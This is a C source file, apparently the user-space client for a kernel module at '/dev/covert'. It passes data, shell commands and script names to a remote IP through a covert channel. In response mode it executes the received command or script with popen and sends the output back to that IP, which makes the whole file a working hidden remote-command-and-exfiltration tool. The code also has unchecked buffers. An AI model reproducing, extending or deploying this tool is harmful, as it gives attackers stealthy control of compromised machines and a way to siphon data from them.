#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#define DEVNAME "/dev/covert"
#define MAX_OUTPRINT_SIZE 0x7FFF

void print_help_message(void);
unsigned int ipstr2addr(const char* ip_str);
char *read_file(const char *fname, char *tar);
int run_command(char *out, const char *command);
int run_sh_file(char *out, const char *fname);
int write_to_module(const char *dname, unsigned int ip, const char *data, int size, int type);

enum MODE
{
    MD_SEND,
    MD_RESP
};

enum TYPE
{
    TP_DATA,
    TP_COMD,
    TP_SHFL,
    TP_ACKN
};

int main(int argc, char *argv[])
{
    /* int fd; */
    /* fd = open(DEVNAME, O_RDWR); */
    /* if (fd == -1) */
    /* { */
        /* printf("Error occurred in opening file %s!\n", DEVNAME); */
        /* return -1; */
    /* } */

    /* char buf[200]; */
    /* char *rbuf; */
    /* unsigned int ip = 117549248; */
    /* int size = 40; */

    /* memcpy(buf, &ip, sizeof(unsigned int)); */
    /* memcpy(buf + sizeof(unsigned int), &size, sizeof(int)); */
    /* memcpy(buf + sizeof(unsigned int) + sizeof(int), "1234567890123456789012345678901234567890", size); */
    /* write(fd, buf, sizeof(unsigned int) + sizeof(int) + size); */

    /* size = lseek(fd, ip, 0); */
    /* printf("size = %d\n", size); */
    /* if (size <= 0) */
    /* { */
        /* return 0; */
    /* } */
    /* rbuf = calloc(size + 1, 1); */
    /* read(fd, rbuf, size); */
    /* puts(rbuf); */

    /* memset(rbuf, 0, size); */
    /* ip = 67217600; */
    /* size = lseek(fd, ip, 0); */
    /* printf("size = %d\n", size); */
    /* if (size <= 0) */
    /* { */
        /* return 0; */
    /* } */
    /* rbuf = calloc(size + 1, 1); */
    /* read(fd, rbuf, size); */
    /* puts(rbuf); */

    /* free(rbuf); */

    /* close(fd); */
    unsigned int ip = 0;
    int loaded_argv;
    int type = TP_DATA, mode = MD_SEND;
    char *arg;

    if (argc == 1 || argv[1][0] != '-')
    {
        print_help_message();
        return 0;
    }
    if (argc == 2 && !strcmp(argv[1], "-h"))
    {
        print_help_message();
        return 0;
    }
    loaded_argv = 1;
    while (loaded_argv < argc)
    {
        if (argv[loaded_argv][0] != '-')
        {
            puts("Error: invaild argument.");
            exit(-1);
        }
        switch (argv[loaded_argv][1])
        {
        case 'i': ip = ipstr2addr(argv[loaded_argv + 1]); loaded_argv += 2; break;
        case 'n': ip = atoi(argv[loaded_argv + 1]); loaded_argv += 2; break;
        case 'c': type = TP_COMD; arg = argv[loaded_argv + 1]; loaded_argv += 2; break;
        case 'd': type = TP_DATA; arg = argv[loaded_argv + 1]; loaded_argv += 2; break;
        case 's': type = TP_SHFL; arg = argv[loaded_argv + 1]; loaded_argv += 2; break;
        case 'S': mode = MD_SEND; loaded_argv++; break;
        case 'R': mode = MD_RESP; loaded_argv++; break;
        default: print_help_message(); exit(0);
        }
        
    }
    if (mode == MD_SEND)
    {
        write_to_module(DEVNAME, ip, arg, strlen(arg), type);
    }
    else if (mode == MD_RESP)
    {
        switch (type)
        {
            case TP_DATA:
                write_to_module(DEVNAME, ip, arg, strlen(arg), TP_DATA);
                break;
            case TP_COMD:
                {
                    char out[MAX_OUTPRINT_SIZE];
                    run_command(out, arg);
                    write_to_module(DEVNAME, ip, out, strlen(out), TP_COMD);
                    break;
                }
            case TP_SHFL:
                {
                    /* char fcont[MAX_OUTPRINT_SIZE]; */
                    /* read_file(arg, fcont); */
                    /* write_to_module(DEVNAME, ip, fcont, strlen(fcont), TP_SHFL); */
                    char out[MAX_OUTPRINT_SIZE];
                    run_sh_file(out, arg);
                    write_to_module(DEVNAME, ip, out, strlen(out), TP_COMD);
                    break;
                }
        }
    }
    return 0;
}

void print_help_message(void)
{
    puts("Usage: main [-h help]");
    puts("            [-i ip] [-c command] [-d data] [-s sh]");
}

unsigned int ipstr2addr(const char* ip_str)
{
    unsigned int ipp[4];
    if (sscanf(ip_str, "%u.%u.%u.%u", ipp + 0, ipp + 1, ipp + 2, ipp + 3) != 4)
    {
        puts("Error: invaild ip string.");
        exit(-1);
    }
    return (ipp[3] << 24) + (ipp[2] << 16) + (ipp[1] << 8) + ipp[0];
}

char *read_file(const char *fname, char *tar)
{
    FILE *fp = fopen(fname, "rb");
    if (!fp)
    {
        printf("Error: failed to open file %s.", fname);
        exit(-1);
    }
    fread(tar, 1, MAX_OUTPRINT_SIZE, fp);
    fclose(fp);
    return tar;
}

int run_command(char *out, const char *command)
{
    char cache[200];
    char cmd[10 + strlen(command)];
    FILE *fp;

    strcpy(cmd, command);
    strcat(cmd, " 2>&1");
    fp = popen(cmd, "r");
    if (!fp)
    {
        exit(-1);
    }
    fread(out, 1, MAX_OUTPRINT_SIZE, fp);
    pclose(fp);
    return 0;
}

int run_sh_file(char *out, const char *fname)
{
    char cmd[10 + strlen(fname)];
    strcpy(cmd, "sh ");
    strcat(cmd, fname);
    return run_command(out, cmd);
}

int write_to_module(const char *dname, unsigned int ip, const char *data, int size, int type)
{
    int fd, offset = 0;
    fd = open(dname, O_RDWR);
    if (fd == -1)
    {
        printf("Error: failed to open file %s!\n", DEVNAME);
        return -1;
    }
    char buf[size + sizeof(unsigned int) + sizeof(int) * 2 + 1];

    memcpy(buf + offset, &ip, sizeof(unsigned int));
    offset += sizeof(unsigned int);
    memcpy(buf + offset, &size, sizeof(int));
    offset += sizeof(int);
    memcpy(buf + offset, &type, sizeof(int));
    offset += sizeof(int);
    memcpy(buf + offset, data, size + 1);
    offset += size;

    write(fd, buf, offset);
    close(fd);
    return 0;;
    /* printf("%s, %d, %d, %d\n%s\n", dname, ip, size, type, data); */
    return 0;
}
